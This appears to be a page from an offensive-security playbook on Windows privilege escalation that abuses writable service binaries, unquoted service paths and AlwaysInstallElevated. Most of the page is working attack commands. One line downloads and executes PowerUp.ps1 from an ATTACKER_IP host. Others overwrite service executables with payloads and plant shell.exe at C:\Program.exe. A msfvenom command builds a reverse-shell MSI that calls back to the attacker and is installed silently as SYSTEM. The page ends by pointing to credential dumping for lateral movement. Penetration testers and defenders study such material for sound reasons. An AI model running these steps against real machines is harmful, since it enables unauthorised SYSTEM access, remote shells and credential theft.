---
id: windows-service-misconfig
title: Windows Service Misconfiguration
stage: privesc
tags: [windows]
summary: Replace a writable service binary or exploit an unquoted service path to execute code as SYSTEM when the service starts — winPEAS catches all of these automatically.
leads_to:
  - system-shell
  - token-impersonation
---

## Prerequisites

A low-privilege Windows shell. At minimum one of: a service binary in a user-writable directory, an unquoted service path with a writable parent, or both AlwaysInstallElevated registry keys set to 1. Run winPEAS first — it flags all three automatically.

Windows services often run as SYSTEM, and if their binary or parent directory is writable by non-admins, you can replace the binary with your payload. Unquoted service paths exploit Windows's path resolution: `C:\Program Files\Some App\service.exe` (unquoted) causes Windows to try `C:\Program.exe` first. AlwaysInstallElevated lets any MSI installer run as SYSTEM regardless of the caller's privileges.

## Quick Win

> Run winPEAS first — it flags writable service binaries, unquoted paths, and AlwaysInstallElevated in one pass.

```powershell
.\winPEAS.exe | Tee-Object C:\Windows\Temp\wp.txt
# Or just: .\winPEAS.exe
```

## Service Binary Hijacking

> Find services with writable binaries, replace the executable, restart the service.

```powershell
# List running services and paths
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}

# Check write permissions
icacls "C:\path\to\service.exe"
# BUILTIN\Users:(F) or (W) = writable

# PowerUp for automated discovery
IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/PowerUp.ps1')
Get-ModifiableServiceFile
```

```bash
# Replace binary and restart service
copy evil.exe "C:\path\to\service.exe"
sc stop ServiceName && sc start ServiceName
```

## Unquoted Service Path

> Unquoted path with spaces → Windows tries partial paths first → plant shell at first writable location.

```cmd
wmic service get name,displayname,pathname,startmode | findstr /i /v "C:\Windows" | findstr /i /v """"
```

If path is `C:\Program Files\Some App\service.exe` (unquoted with spaces):
- Windows first tries `C:\Program.exe` — plant reverse shell there if writable

```bash
copy shell.exe "C:\Program.exe"
sc start ServiceName
```

## AlwaysInstallElevated (MSI as SYSTEM)

> Both HKCU and HKLM must be set to 1 — any MSI then runs as SYSTEM.

```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```bash
# Attacker: generate MSI payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=PORT -f msi -o evil.msi

# Target: install it (runs as SYSTEM)
msiexec /quiet /qn /i C:\Windows\Temp\evil.msi
```

## Leads To

Service binary replaced → reverse shell as SYSTEM → system-shell → dump SAM/LSA for lateral movement. Unquoted path exploited → same SYSTEM shell. AlwaysInstallElevated → MSI fires → SYSTEM shell. SYSTEM service account → check `whoami /priv` for SeImpersonatePrivilege as an alternative route.
